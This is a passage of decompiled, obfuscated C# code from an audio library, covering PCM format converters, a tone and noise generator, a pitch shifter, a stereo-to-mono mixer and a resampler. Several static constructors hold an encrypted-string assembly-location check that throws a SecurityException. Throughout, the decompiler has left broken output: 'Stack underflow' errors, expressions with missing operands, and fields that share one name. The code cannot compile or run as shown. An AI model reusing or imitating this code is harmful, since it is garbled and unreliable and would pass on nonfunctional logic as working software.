				if (this._0002 >= this._0003)
				{
					this.m__0001++;
					this._0002 = 0;
				}
			}
			if (this.m__0001 == 2)
			{
				if (this._0004 > 0)
				{
					float[] array = new float[WaveFormat._0001 * WaveFormat._0001];
					int num5;
					for (int j = 0; j < this._0004; j += num5)
					{
						int num4 = _0016_0002._0018_0005(this._0004 - j, array.Length);
						num5 = this.m__0001._0001(array, 0, num4);
						if (num5 == 0)
						{
							break;
						}
					}
				}
				this.m__0001++;
				this._0002 = 0;
			}
			if (this.m__0001 == 3)
			{
				int num6 = _0004 - num;
				if (_0005 != 0)
				{
					num6 = _0016_0002._0018_0005(num6, _0005 - this._0002);
				}
				int num7 = this.m__0001._0001(_0002, _0003 + num, num6);
				this._0002 += num7;
				num += num7;
				if (num7 < num6 || (_0005 > 0 && this._0002 >= _0005))
				{
					this.m__0001++;
					this._0002 = 0;
				}
			}
			if (this.m__0001 == 4)
			{
				int num8 = _0016_0002._0018_0005(_0004 - num, _0006 - this._0002);
				for (int k = 0; k < num8; k++)
				{
					_0002[_0003 + num + k] = 0f;
				}
				this._0002 += num8;
				num += num8;
				if (this._0002 >= _0006)
				{
					this.m__0001++;
					this._0002 = 0;
				}
			}
			return num;
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal sealed class _0010 : global::_0080._0007
	{
		public _0010(global::_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_007b: Expected I4, but got Unknown
			//IL_0081: Incompatible stack heights: 0 vs 1
			int count = /*Error near IL_0004: Stack underflow*/* 4;
			global::_0011._0018._0001((int)/*Error near IL_000e: Stack underflow*/, (global::_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int num2 = _0003;
			for (int i = 0; i < num; i += 4)
			{
				_0002[num2++] = (float)(((sbyte)base._0001[i + 3] << 24) | (base._0001[i + 2] << 16) | (base._0001[i + 1] << 8) | base._0001[i]) / 2.1474836E+09f;
			}
			return num / 4;
		}
	}
}
namespace _0080
{
	internal abstract class _0007 : global::_0002._0007
	{
		protected _001C._0004 _0001;

		private global::_0005._0005 m__0001;

		protected internal byte[] _0001;

		public global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0007(_001C._0004 _001D_0013)
		{
			this._0001 = _001D_0013;
			this.m__0001 = global::_0011._0018._0001(_001D_0013.WaveFormat._0001, (int)_001D_0013.WaveFormat._0001);
		}

		public abstract int _0001(float[] _0002, int _0003, int _0004);
	}
}
namespace _0011
{
	internal static class _0006
	{
		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _0008 : global::_001C._0004
	{
		private readonly global::_0002._0007 _0001;

		private readonly global::_0005._0005 _0001;

		private volatile float _0001;

		private float[] _0001;

		public global::_0005._0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0009: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_000b: Stack underflow*/)._0001 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public _0008(global::_0002._0007 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(global::_0080._0014._0001(107385276), global::_0080._0014._0001(107387450));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(global::_0080._0014._0001(107385187), global::_0080._0014._0001(107387450));
			}
			this._0001 = new global::_0005._0005(_0002_0090_0006.WaveFormat._0001, 16, _0002_0090_0006.WaveFormat._0001);
			this._0001 = _0002_0090_0006;
			this._0001 = 1f;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_009f: Incompatible stack heights: 0 vs 1
			//IL_00a5: Expected I4, but got Unknown
			//IL_00ab: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*// 2;
			float[] array = global::_0011._0018._0001(num, _0001);
			((_0008)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			int num2 = this._0001._0001(_0001, 0, num);
			global::_0080._0004 obj = new global::_0080._0004(_0002);
			int num3 = _0003 / 2;
			for (int i = 0; i < num2; i++)
			{
				float num4 = _0001[i] * this._0001;
				if (num4 > 1f)
				{
					num4 = 1f;
				}
				if (num4 < -1f)
				{
					num4 = -1f;
				}
				obj.ShortBuffer[num3++] = (short)(num4 * 32767f);
			}
			return num2 * 2;
		}
	}
}
namespace _001E
{
	internal sealed class _0008 : _001C._0004
	{
		private readonly global::_0002._0007 _0001;

		private readonly global::_0005._0005 _0001;

		private volatile float _0001;

		private float[] _0001;

		public global::_0005._0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0009: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_000b: Stack underflow*/)._0001 = (float)/*Error near IL_000b: Stack underflow*/;
			}
		}

		public _0008(global::_0002._0007 _0002_0090_0006)
		{
			if (_0002_0090_0006.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107385276), _0080._0014._0001(107387450));
			}
			if (_0002_0090_0006.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(_0080._0014._0001(107385187), _0080._0014._0001(107387450));
			}
			this._0001 = new global::_0005._0005(_0002_0090_0006.WaveFormat._0001, 24, _0002_0090_0006.WaveFormat._0001);
			this._0001 = _0002_0090_0006;
			this._0001 = 1f;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Expected I4, but got Unknown
			//IL_00bb: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*// 3;
			float[] array = global::_0011._0018._0001(num, _0001);
			((_0008)/*Error near IL_0022: Stack underflow*/)._0001 = array;
			int num2 = this._0001._0001(_0001, 0, num);
			int num3 = _0003;
			for (int i = 0; i < num2; i++)
			{
				float num4 = _0001[i] * this._0001;
				if (num4 > 1f)
				{
					num4 = 1f;
				}
				if (num4 < -1f)
				{
					num4 = -1f;
				}
				int num5 = (int)((double)num4 * 8388607.0);
				_0002[num3++] = (byte)num5;
				_0002[num3++] = (byte)(num5 >> 8);
				_0002[num3++] = (byte)(num5 >> 16);
			}
			return num2 * 3;
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0003
{
	internal sealed class _0004 : global::_0002._0007
	{
		private readonly global::_0005._0005 m__0001;

		internal readonly Random _0001 = new Random();

		private readonly double[] m__0001 = new double[7];

		private const double m__0001 = Math.PI * 2.0;

		private int m__0001;

		private double _0002;

		[CompilerGenerated]
		private double _0003;

		[CompilerGenerated]
		private double m__0004;

		[CompilerGenerated]
		private double _0005;

		[CompilerGenerated]
		private bool[] m__0001;

		[CompilerGenerated]
		private global::_0002._000F m__0001;

		[CompilerGenerated]
		private double _0006;

		public global::_0005._0005 WaveFormat => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public double Frequency
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0003 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double FrequencyLog
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_0015._009D_0002;
				_ = ((_0004)/*Error near IL_0014: Stack underflow*/).Frequency;
				/*Error near IL_001b: Stack underflow*/((double)/*Error near IL_001b: Stack underflow*/);
				return (double)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public double FrequencyEnd
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0004 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double FrequencyEndLog
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_0015._009D_0002;
				_ = ((_0004)/*Error near IL_0014: Stack underflow*/).FrequencyEnd;
				/*Error near IL_001b: Stack underflow*/((double)/*Error near IL_001b: Stack underflow*/);
				return (double)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public double Gain
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0005 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public bool[] PhaseReverse
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0001 = (bool[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0002._000F Type
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0002._000F)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public double SweepLengthSecs
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0006;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0006 = (double)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0004()
			: this(44100, 2)
		{
		}

		public _0004(int _008E_008F_0006, int _008D_0090_0006)
		{
			_0002 = 0.0;
			this.m__0001 = global::_0011._0018._0001(_008E_008F_0006, _008D_0090_0006);
			Type = global::_0002._000F._0004;
			Frequency = 440.0;
			Gain = 1.0;
			PhaseReverse = new bool[_008D_0090_0006];
			SweepLengthSecs = 2.0;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_047c: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_0482: Stack underflow*/;
			for (int i = 0; i < _0004 / this.m__0001._0001; i++)
			{
				double num2;
				switch (Type)
				{
				case global::_0002._000F._0004:
				{
					double num4 = Math.PI * 2.0 * Frequency / (double)this.m__0001._0001;
					num2 = Gain * global::_0015._009B_0002((double)this.m__0001 * num4);
					this.m__0001++;
					break;
				}
				case global::_0002._000F._0005:
				{
					double num4 = 2.0 * Frequency / (double)this.m__0001._0001;
					double num7 = (double)this.m__0001 * num4 % 2.0 - 1.0;
					num2 = ((num7 > 0.0) ? Gain : (0.0 - Gain));
					this.m__0001++;
					break;
				}
				case global::_0002._000F._0006:
				{
					double num4 = 2.0 * Frequency / (double)this.m__0001._0001;
					double num7 = (double)this.m__0001 * num4 % 2.0;
					num2 = 2.0 * num7;
					if (num2 > 1.0)
					{
						num2 = 2.0 - num2;
					}
					if (num2 < -1.0)
					{
						num2 = -2.0 - num2;
					}
					num2 *= Gain;
					this.m__0001++;
					break;
				}
				case global::_0002._000F._0007:
				{
					double num4 = 2.0 * Frequency / (double)this.m__0001._0001;
					double num7 = (double)this.m__0001 * num4 % 2.0 - 1.0;
					num2 = Gain * num7;
					this.m__0001++;
					break;
				}
				case global::_0002._000F._0002:
					num2 = Gain * global::_0011._0018._0001(this);
					break;
				case global::_0002._000F._0001:
				{
					double num5 = global::_0011._0018._0001(this);
					this.m__0001[0] = 0.99886 * this.m__0001[0] + num5 * 0.0555179;
					this.m__0001[1] = 0.99332 * this.m__0001[1] + num5 * 0.0750759;
					this.m__0001[2] = 0.969 * this.m__0001[2] + num5 * 0.153852;
					this.m__0001[3] = 0.8665 * this.m__0001[3] + num5 * 0.3104856;
					this.m__0001[4] = 0.55 * this.m__0001[4] + num5 * 0.5329522;
					this.m__0001[5] = -0.7616 * this.m__0001[5] - num5 * 0.016898;
					double num6 = this.m__0001[0] + this.m__0001[1] + this.m__0001[2] + this.m__0001[3] + this.m__0001[4] + this.m__0001[5] + this.m__0001[6] + num5 * 0.5362;
					this.m__0001[6] = num5 * 0.115926;
					num2 = Gain * (num6 / 5.0);
					break;
				}
				case global::_0002._000F._0003:
				{
					double num3 = global::_0015._009E_0002(FrequencyLog + (double)this.m__0001 * (FrequencyEndLog - FrequencyLog) / (SweepLengthSecs * (double)this.m__0001._0001));
					double num4 = Math.PI * 2.0 * num3 / (double)this.m__0001._0001;
					this._0002 += num4;
					num2 = Gain * global::_0015._009B_0002(this._0002);
					this.m__0001++;
					if ((double)this.m__0001 > SweepLengthSecs * (double)this.m__0001._0001)
					{
						this.m__0001 = 0;
						this._0002 = 0.0;
					}
					break;
				}
				default:
					num2 = 0.0;
					break;
				}
				for (int j = 0; j < this.m__0001._0001; j++)
				{
					if (PhaseReverse[j])
					{
						_0002[num++] = (float)(0.0 - num2);
					}
					else
					{
						_0002[num++] = (float)num2;
					}
				}
			}
			return _0004;
		}
	}
}
namespace _0002
{
	internal enum _000F
	{
		_0001,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006,
		_0007
	}
}
namespace _0019
{
	internal sealed class _0007 : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		private readonly global::_0005._0005 m__0001;

		internal float _0001 = 1f;

		private readonly int m__0001;

		private readonly long m__0001;

		private readonly global::_001D._0015 m__0001 = new global::_001D._0015();

		private readonly global::_001D._0015 _0002 = new global::_001D._0015();

		private const float _0002 = 0.95f;

		private const float _0003 = 0.050000012f;

		private const float _0004 = (float)Math.PI / 2f;

		public global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public float PitchFactor
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0007)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0007(global::_0002._0007 _0002_0090_0006)
			: this(_0002_0090_0006, 4096, 4L, 1f)
		{
		}

		public _0007(global::_0002._0007 _0002_0090_0006, int _008E_0090_0006, long _008F_0090_0006, float _0090_0090_0006)
		{
			this.m__0001 = _0002_0090_0006;
			this.m__0001 = _0002_0090_0006.WaveFormat;
			this.m__0001 = _008E_0090_0006;
			this.m__0001 = _008F_0090_0006;
			this._0001 = _0090_0090_0006;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_01f6: Incompatible stack heights: 0 vs 1
			//IL_01fc: Incompatible stack heights: 0 vs 2
			//IL_0202: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_000a: Stack underflow*/).m__0001;
			int num = ((global::_0002._0007)/*Error near IL_001a: Stack underflow*/)._0001((float[])/*Error near IL_001a: Stack underflow*/, (int)/*Error near IL_001a: Stack underflow*/, _0004);
			if (this._0001 == 1f)
			{
				return num;
			}
			if (this.m__0001._0001 == 1)
			{
				float[] array = new float[num];
				int num2 = 0;
				for (int i = _0003; i <= num + _0003 - 1; i++)
				{
					array[num2] = _0002[i];
					num2++;
				}
				global::_001D._0015 obj = this.m__0001;
				float num3 = this._0001;
				long num4 = this.m__0001;
				long num5 = this.m__0001;
				float num6 = this.m__0001._0001;
				global::_0011._0018._0001(num5, (long)num, num3, obj, num4, num6, array);
				num2 = 0;
				for (int j = _0003; j <= num + _0003 - 1; j++)
				{
					_0002[j] = global::_0011._0018._0001(this, array[num2]);
					num2++;
				}
				return num;
			}
			if (this.m__0001._0001 == 2)
			{
				float[] array2 = new float[num >> 1];
				float[] array3 = new float[num >> 1];
				int num7 = 0;
				for (int k = _0003; k <= num + _0003 - 1; k += 2)
				{
					array2[num7] = _0002[k];
					array3[num7] = _0002[k + 1];
					num7++;
				}
				global::_001D._0015 obj = this.m__0001;
				float num3 = this._0001;
				long num4 = this.m__0001;
				long num5 = this.m__0001;
				float num6 = this.m__0001._0001;
				global::_0011._0018._0001(num5, (long)(num >> 1), num3, obj, num4, num6, array2);
				obj = this._0002;
				num3 = this._0001;
				num4 = this.m__0001;
				num5 = this.m__0001;
				num6 = this.m__0001._0001;
				global::_0011._0018._0001(num5, (long)(num >> 1), num3, obj, num4, num6, array3);
				num7 = 0;
				for (int l = _0003; l <= num + _0003 - 1; l += 2)
				{
					_0002[l] = global::_0011._0018._0001(this, array2[num7]);
					_0002[l + 1] = global::_0011._0018._0001(this, array3[num7]);
					num7++;
				}
				return num;
			}
			throw new Exception(global::_0080._0014._0001(107385170));
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0008
{
	internal sealed class _0006 : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		private float[] m__0001;

		[CompilerGenerated]
		private float m__0001;

		[CompilerGenerated]
		private float _0002;

		[CompilerGenerated]
		private global::_0005._0005 m__0001;

		public float LeftVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float RightVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0006(global::_0002._0007 _0002_0090_0006)
		{
			LeftVolume = 0.5f;
			RightVolume = 0.5f;
			if (_0002_0090_0006.WaveFormat._0001 != 2)
			{
				throw new ArgumentException(_0080._0014._0001(107387389));
			}
			this.m__0001 = _0002_0090_0006;
			WaveFormat = global::_0011._0018._0001(_0002_0090_0006.WaveFormat._0001, 1);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008e: Expected I4, but got Unknown
			//IL_0094: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0007: Stack underflow*/* 2;
			if (((_0006)/*Error near IL_0016: Stack underflow*/).m__0001 == null || this.m__0001.Length < num)
			{
				this.m__0001 = new float[num];
			}
			int num2 = this.m__0001._0001(this.m__0001, 0, num);
			int num3 = _0003 / 2;
			for (int i = 0; i < num2; i += 2)
			{
				float num4 = this.m__0001[i];
				float num5 = this.m__0001[i + 1];
				float num6 = num4 * LeftVolume + num5 * RightVolume;
				_0002[num3++] = num6;
			}
			return num2 / 2;
		}
	}
}
namespace _0001
{
	internal sealed class _000E : global::_0080._0007
	{
		public _000E(global::_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
			if (_001D_0013.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(global::_0080._0014._0001(107384545));
			}
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0066: Expected I4, but got Unknown
			//IL_0069: Incompatible stack heights: 0 vs 1
			int count = /*Error near IL_0004: Stack underflow*/* 8;
			global::_0011._0018._0001((int)/*Error near IL_000e: Stack underflow*/, (global::_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int result = num / 8;
			int num2 = _0003;
			for (int i = 0; i < num; i += 8)
			{
				long num3 = _0014_0003._0090_0006(base._0001, i);
				_0002[num2++] = (float)_0015_0003._0091_0006(num3);
			}
			return result;
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0007 : global::_0002._0007
	{
		private readonly global::_000E._0019 m__0001;

		private readonly global::_0005._0005 m__0001;

		private readonly global::_0002._0007 m__0001;

		private readonly int m__0001;

		public global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0007(global::_0002._0007 _001D_0013, int _0091_0090_0006)
		{
			this.m__0001 = _001D_0013.WaveFormat._0001;
			this.m__0001 = global::_0011._0018._0001(_0091_0090_0006, this.m__0001);
			this.m__0001 = _001D_0013;
			this.m__0001 = new global::_000E._0019();
			global::_0011._0018._0001(2, false, this.m__0001, 64, true, 32);
			global::_0011._0018._0001(0.707f, this.m__0001, 0.693f);
			this.m__0001._0002 = false;
			global::_000E._0019 obj = this.m__0001;
			double num = _001D_0013.WaveFormat._0001;
			global::_0011._0018._0001(num, (double)_0091_0090_0006, obj);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_007b: Expected I4, but got Unknown
			int num = ((_0007)/*Error near IL_0009: Stack underflow*/).m__0001;
			int num2 = /*Error near IL_000a: Stack underflow*// num;
			global::_000E._0019 obj = this.m__0001;
			int num3 = this.m__0001._0001;
			int num4;
			float[] array = default(float[]);
			int num5 = global::_0011._0018._0001(num2, obj, out num4, num3, ref array);
			int num6 = this.m__0001._0001(array, num4, num5 * this.m__0001) / this.m__0001;
			global::_000E._0019 obj2 = this.m__0001;
			int num7 = this.m__0001;
			return global::_0011._0018._0001(num7, num6, _0003, _0002, obj2, num2) * this.m__0001;
		}
	}
}
namespace _0003
{
	internal interface _0005
	{
		bool _0001(global::_0005._0005 _0002);

		void _0001(_001C._0004 _0002, int _0003);

		bool _0001(out float _0002, out float _0003);
	}
}
namespace _0016
{
	internal sealed class _0010 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private _0080._0004 m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 16)
			{
				return ((global::_0005._0005)/*Error near IL_001c: Stack underflow*/)._0001 == 1;
			}
			return false;
		}

		public void _0001(global::_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Expected I4, but got Unknown
			//IL_004f: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 2;
			((_0010)/*Error near IL_000e: Stack underflow*/).m__0001 = 0;
			this.m__0001 = global::_0011._0018._0001(num, this.m__0001);
			this.m__0001 = new _0080._0004(this.m__0001);
			this._0002 = _0002.Read(this.m__0001, 0, num) / 2;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 2
			//IL_0054: Incompatible stack heights: 0 vs 1
			_ = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0010)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = (float)this.m__0001.ShortBuffer[this.m__0001++] / 32768f;
				*(float*)(nint)/*Error near IL_0037: Stack underflow*/ = num2;
				_0003 = _0002;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
